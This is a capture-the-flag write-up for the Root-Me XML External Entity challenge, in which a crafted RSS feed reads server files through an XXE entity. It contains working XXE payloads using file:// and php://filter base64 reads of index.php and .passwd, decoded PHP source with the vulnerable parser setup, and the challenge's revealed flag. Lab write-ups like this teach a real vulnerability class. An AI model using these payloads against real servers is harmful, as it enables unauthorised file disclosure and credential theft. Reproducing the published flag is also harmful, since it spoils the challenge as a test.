## Challenge name: 


<img width="1392" height="433" alt="image" src="https://github.com/user-attachments/assets/b66a94ca-b38d-44d1-a443-c899a59259b9" />
<br>
<br>

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity](https://www.root-me.org/en/Challenges/Web-Server/XML-External-Entity)
<br>
<br>

**After starting the challange we can see a page having two features one checks for rss validity and another is login.**

<br>
<img width="1392" height="433" alt="image" src="https://github.com/user-attachments/assets/69980984-f88d-4205-8f71-725ea611760c" />
<br><br>
<img width="1392" height="433" alt="image" src="https://github.com/user-attachments/assets/a8e07b58-b1c7-458c-8133-ba9934e2322f" />
<br>
<br>

**As the challenge says we have to retrive the administrator password using xxe so the password might be in the index.php itself and .php file runs on server site so we can't see its source code but if somehow if we are able to prase our arbitrary xml into the server from that validity checker we can retrive index file and get the flag form code..**

```
<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
<channel>
  <title>Sample Feed</title>
  <link>http://example.com</link>
  <description>A valid RSS feed</description>
  <item>
    <title>This is a title</title>
    <link>http://example.com/item1</link>
    <description>Item description here</description>
  </item>
</channel>
</rss>
```

**So I copyed a randrom template from internet and we will put it in [pastebin](https://pastebin.com/) and provide its raw link to the challenge validity checker and observe what happens and btw RSS is just XML fetched server side over HTTP which means any unsafe XML parser effectively becomes an XXE gateway.**


**After uploading the xml code in pastebin I copyed it's raw link [https://pastebin.com/raw/xN99aPkL]() and pasted in root-me challenge RSS Validity Checker..**

<br>
<img width="1392" height="433" alt="image" src="https://github.com/user-attachments/assets/9661f201-a9de-4899-addf-7179faeb5ae4" />
<br>
<br>

**It said xml document is valid and whatever was in our title it displayed in site so lets try with crafted payload:**


```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [
  <!ELEMENT title ANY>
  <!ENTITY xxe SYSTEM "file:///challenge/web-serveur/ch29/index.php">
]>
<rss version="2.0">
<channel>
  <title>Test RSS</title>
  <link>https://example.com</link>
  <description>Test Description</description>
  <item>
    <title>&xxe;</title>
    <link>https://example.com/item</link>
    <description>Item description</description>
  </item>
</channel>
</rss>
```

**Now lets try with this payload where / is the web root we are retriving file from web-serveur/ch29/index.php something alike lfi or ssrf whatever you say..**

<br>
<img width="1392" height="433" alt="image" src="https://github.com/user-attachments/assets/940cf1ed-f1f6-4425-a697-2d4ec0ce2134" />
<br>
<br>

**So, it said invalid xml document and I assume it happened because there is some kind of filterization going on or** ``` <?php ?> ``` **form index file broke things lets try fetching file contents in base64 encoading..**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [
  <!ELEMENT title ANY>
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php">
]>
<rss version="2.0">
<channel>
  <title>Test RSS</title>
  <link>https://example.com</link>
  <description>Test Description</description>
  <item>
    <title>&xxe;</title>
    <link>https://example.com/item</link>
    <description>Item description</description>
  </item>
</channel>
</rss>
```

<br>
<img width="1392" height="433" alt="image" src="https://github.com/user-attachments/assets/27247466-c509-4cc0-b65e-c0552e54eaa9" />
<br>
<br>

**Yep we got contents of index.php file in base64 format so lets decode it and retrive the user%pass or flag from that file using this:**

```
echo -n "PD9waHAKCmVjaG8gJzxodG1sPic7CmVjaG8gJzxoZWFkZXI+PHRpdGxlPlhYRTwvdGl0bGU+PC9oZWFkZXI+JzsKZWNobyAnPGJvZHk+JzsKZWNobyAnPGgzPjxhIGhyZWY9Ij9hY3Rpb249Y2hlY2tlciI+Y2hlY2tlcjwvYT4mbmJzcDt8Jm5ic3A7PGEgaHJlZj0iP2FjdGlvbj1hdXRoIj5sb2dpbjwvYT48L2gzPjxociAvPic7CgppZiAoICEgaXNzZXQoJF9HRVRbJ2FjdGlvbiddKSApICRfR0VUWydhY3Rpb24nXT0iY2hlY2tlciI7CgppZigkX0dFVFsnYWN0aW9uJ10gPT0gImNoZWNrZXIiKXsKCiAgIGxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOwogICBsaWJ4bWxfdXNlX2ludGVybmFsX2Vycm9ycyh0cnVlKTsKCiAgIGVjaG8gJzxoMj5SU1MgVmFsaWRpdHkgQ2hlY2tlcjwvaDI+CiAgIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJpbmRleC5waHAiPgogICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXJsIiBwbGFjZWhvbGRlcj0iaHR0cDovL2hvc3QudGxkL3JzcyIgLz4KICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgLz4KICAgPC9mb3JtPic7CgoKICAgIGlmKGlzc2V0KCRfUE9TVFsidXJsIl0pICYmICEoZW1wdHkoJF9QT1NUWyJ1cmwiXSkpKSB7CiAgICAgICAgJHVybCA9ICRfUE9TVFsidXJsIl07CiAgICAgICAgZWNobyAiPHA+VVJMIDogIi5odG1sZW50aXRpZXMoJHVybCkuIjwvcD4iOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgICRjaCA9IGN1cmxfaW5pdCgiJHVybCIpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMyk7CiAgICAgICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCAsMCk7IAogICAgICAgICAgICAkaW5qZWN0ID0gY3VybF9leGVjKCAkY2ggKTsKICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOwogICAgICAgICAgICAkc3RyaW5nID0gc2ltcGxleG1sX2xvYWRfc3RyaW5nKCRpbmplY3QsIG51bGwsIExJQlhNTF9OT0VOVCk7CiAgICAgICAgICAgIGlmICggISBpc19vYmplY3QoJHN0cmluZykgfHwgISRzdHJpbmcgfHwgISgkc3RyaW5nLT5jaGFubmVsKSB8fCAhKCRzdHJpbmctPmNoYW5uZWwtPml0ZW0pKSB0aHJvdyBuZXcgRXhjZXB0aW9uKCJlcnJvciIpOyAKCiAgICAgICAgICAgIGZvcmVhY2goJHN0cmluZy0+Y2hhbm5lbC0+aXRlbSBhcyAkcm93KXsKICAgICAgICAgICAgICAgIHByaW50ICI8YnIgLz4iOwogICAgICAgICAgICAgICAgcHJpbnQgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSI7CiAgICAgICAgICAgICAgICBwcmludCAiPGJyIC8+IjsKICAgICAgICAgICAgICAgIHByaW50IGh0bWxlbnRpdGllcygkcm93LT50aXRsZSk7CiAgICAgICAgICAgICAgICBwcmludCAiPGJyIC8+IjsKICAgICAgICAgICAgICAgIHByaW50ICI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iOwogICAgICAgICAgICAgICAgcHJpbnQgIjxiciAvPiI7CiAgICAgICAgICAgICAgICBwcmludCAiPGg0IHN0eWxlPSdjb2xvcjogZ3JlZW47Jz5YTUwgZG9jdW1lbnQgaXMgdmFsaWQ8L2g0PiI7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsKICAgICAgICAgICAgcHJpbnQgIjxoNCBzdHlsZT0nY29sb3I6IHJlZDsnPlhNTCBkb2N1bWVudCBpcyBub3QgdmFsaWQ8L2g0PiI7CiAgICAgICAgfQoKICAgIH0KfQoKaWYoJF9HRVRbJ2FjdGlvbiddID09ICJhdXRoIil7CiAgICBlY2hvICc8c3Ryb25nPkxvZ2luPC9zdHJvbmc+PGJyIC8+PGZvcm0gTUVUSE9EPSJQT1NUIj4KICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VybmFtZSIgLz4KICAgIDxiciAvPgogICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgLz4KICAgIDxiciAvPgogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgLz4KICAgIDwvZm9ybT4KICAgICc7CiAgICBpZihpc3NldCgkX1BPU1RbJ3VzZXJuYW1lJ10sICRfUE9TVFsncGFzc3dvcmQnXSkgJiYgIWVtcHR5KCRfUE9TVFsndXNlcm5hbWUnXSkgJiYgIWVtcHR5KCRfUE9TVFsncGFzc3dvcmQnXSkpCiAgICB7CiAgICAgICAgJHVzZXI9JF9QT1NUWyJ1c2VybmFtZSJdOwogICAgICAgICRwYXNzPSRfUE9TVFsicGFzc3dvcmQiXTsKICAgICAgICBpZigkdXNlciA9PT0gImFkbWluIiAmJiAkcGFzcyA9PT0gIiIuZmlsZV9nZXRfY29udGVudHMoIi5wYXNzd2QiKS4iIil7CiAgICAgICAgICAgIHByaW50ICJGbGFnOiAiLmZpbGVfZ2V0X2NvbnRlbnRzKCIucGFzc3dkIikuIjxiciAvPiI7CiAgICAgICAgfQoKICAgIH0KCn0KCgplY2hvICc8L2JvZHk+PC9odG1sPic7Cg==<br />===================================================" | base64 --decode
```

**After decoading and observing source code we can find this part where validation is going on :**

<br>
<img width="1470" height="364" alt="image" src="https://github.com/user-attachments/assets/6be17e44-e6c8-404b-9009-da31a96f8a3b" />
<br>
<br>

**Username is admin but the password is .passwd content itself so we should directly fetch .passwd file which is our flag using this payload:**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [
  <!ELEMENT title ANY>
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd">
]>
<rss version="2.0">
<channel>
  <title>Test RSS</title>
  <link>https://example.com</link>
  <description>Test Description</description>
  <item>
    <title>&xxe;</title>
    <link>https://example.com/item</link>
    <description>Item description</description>
  </item>
</channel>
</rss>
```

<br>
<img width="1348" height="364" alt="image" src="https://github.com/user-attachments/assets/3ade9c53-e837-4473-9ec4-db69adb48014" />
<br><br>
<img width="1329" height="364" alt="image" src="https://github.com/user-attachments/assets/d8d37baa-dfe3-4a3a-b755-47a02f745d85" />
<br>
<br>

**That was the challenge we can use this "c934fed17f1cac3045ddfeca34f332bc" as flag/passwd to validate.**
<br>
**Thankyou.**
